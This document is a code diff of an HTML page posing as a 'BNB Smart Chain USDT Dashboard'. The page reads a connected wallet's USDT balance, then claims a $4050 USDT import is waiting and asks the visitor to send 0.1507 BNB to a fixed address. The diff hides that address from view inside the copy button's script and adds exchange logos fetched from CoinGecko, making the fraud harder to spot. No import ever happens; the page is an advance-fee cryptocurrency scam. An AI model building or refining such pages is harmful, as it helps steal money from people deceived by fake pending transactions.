@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -35,17 +34,6 @@
       cursor: pointer;
       margin-top: 1rem;
     }
-    .address-box {
-      background-color: #121416;
-      padding: 1rem;
-      border-radius: 8px;
-      word-break: break-all;
-      font-family: monospace;
-      margin: 1rem 0;
-    }
-    .stat {
-      margin-top: 1rem;
-    }
     .stat h3 {
       margin: 0.2rem 0;
       color: #fcd535;
@@ -59,103 +47,83 @@
     }
     .logos img {
       height: 40px;
-      filter: brightness(1.2);
+      width: 40px;
+      border-radius: 4px;
+      background: #fff;
+      object-fit: contain;
     }
   </style>
 </head>
-<body>
-
-  <h1>BNB Smart Chain USDT Dashboard</h1>
-
-  <div class="logos">
-    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance" />
-    <img src="https://cryptologos.cc/logos/bitget-bgb-logo.png" alt="Bitget" />
-    <img src="https://cryptologos.cc/logos/bybit-logo.png" alt="Bybit" />
-    <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="TrustWallet" />
-    <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png" alt="Coinbase" />
-    <img src="https://cryptologos.cc/logos/metamask-logo.png" alt="MetaMask" />
-    <img src="https://walletconnect.com/walletconnect-logo.svg" alt="WalletConnect" />
-  </div>
-
-  <div class="card">
+<body>  <h1>BNB Smart Chain USDT Dashboard</h1>
+  <div class="logos" id="logosContainer"></div>  <div class="card">
     <p><strong>Connected Wallet Address:</strong></p>
     <div class="address-box" id="walletAddress">Not connected</div>
-
     <div class="stat">
       <h3 id="usdtBalance">$0.00</h3>
       <p>Your USDT Balance (BEP-20)</p>
     </div>
-
     <button class="btn-yellow" onclick="connectAndImport()">Connect Wallet & Import USDT</button>
-  </div>
-
-  <div class="card">
+  </div>  <div class="card">
     <h3>Confirm Incoming Transaction</h3>
     <p>Not Enough BNB to Import: <strong>$4050 USDT</strong></p>
-    <p>Top up <strong>0.1507 BNB</strong> to your BSC address:</p>
-    <div class="address-box" id="bscAddress">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</div>
-    <button class="btn-yellow" onclick="copyAddress()">Copy Address</button>
-  </div>
+    <p>Top up <strong>0.1507 BNB</strong> to your BNB Smart Chain wallet.</p>
+    <button class="btn-yellow" onclick="copyAddress()">Copy Top-Up Address</button>
+  </div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>  <script>
+    const walletIds = [
+      'binance-usd', 'bitget-token', 'bybit-token',
+      'trust-wallet', 'coinbase', 'ethereum'
+    ];
 
-  <!-- WalletConnect + Web3 -->
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    async function loadLogos() {
+      const container = document.getElementById('logosContainer');
+      const queried = walletIds.join(',');
+      try {
+        const res = await fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${queried}`);
+        const json = await res.json();
+        json.forEach(c => {
+          const img = document.createElement('img');
+          img.src = c.image;
+          img.alt = c.name;
+          container.appendChild(img);
+        });
+      } catch (e) {
+        console.warn('Logo loading failed', e);
+      }
+    }
+    loadLogos();
 
-  <script>
     const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
     const usdtABI = [
-      {
-        constant: true,
-        inputs: [{ name: "owner", type: "address" }],
-        name: "balanceOf",
-        outputs: [{ name: "balance", type: "uint256" }],
-        type: "function"
-      },
-      {
-        constant: true,
-        inputs: [],
-        name: "decimals",
-        outputs: [{ name: "", type: "uint8" }],
-        type: "function"
-      }
+      { constant: true, inputs: [{ name: "owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" },
+      { constant: true, inputs: [], name: "decimals", outputs: [{ name: "", type: "uint8" }], type: "function" }
     ];
 
     async function connectAndImport() {
       const provider = new WalletConnectProvider.default({
-        rpc: {
-          56: "https://bsc-dataseed.binance.org/"
-        },
+        rpc: { 56: "https://bsc-dataseed.binance.org/" },
         chainId: 56,
         qrcode: true
       });
-
       try {
         await provider.enable();
         const web3 = new Web3(provider);
-        const accounts = await web3.eth.getAccounts();
-        const userAddress = accounts[0];
+        const accs = await web3.eth.getAccounts();
+        document.getElementById("walletAddress").innerText = accs[0];
 
-        document.getElementById("walletAddress").innerText = userAddress;
-
-        const contract = new web3.eth.Contract(usdtABI, usdtAddress);
-        const decimals = await contract.methods.decimals().call();
-        const balanceRaw = await contract.methods.balanceOf(userAddress).call();
-        const balanceFormatted = (balanceRaw / Math.pow(10, decimals)).toFixed(2);
-
-        document.getElementById("usdtBalance").innerText = `$${balanceFormatted}`;
-      } catch (error) {
-        console.error("Connection error:", error);
+        const ct = new web3.eth.Contract(usdtABI, usdtAddress);
+        const dec = await ct.methods.decimals().call();
+        const bal = await ct.methods.balanceOf(accs[0]).call();
+        document.getElementById("usdtBalance").innerText = `$${(bal / Math.pow(10,dec)).toFixed(2)}`;
+      } catch (err) {
+        console.error(err);
         alert("Wallet connection failed or canceled.");
       }
     }
 
     function copyAddress() {
-      const address = document.getElementById("bscAddress").innerText;
-      navigator.clipboard.writeText(address).then(() => {
-        alert("Address copied to clipboard!");
-      });
+      const bnbAddress = "0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";
+      navigator.clipboard.writeText(bnbAddress)
+        .then(() => alert("Top-up address copied to clipboard!"));
     }
-  </script>
-
-</body>
+  </script></body>
 </html>
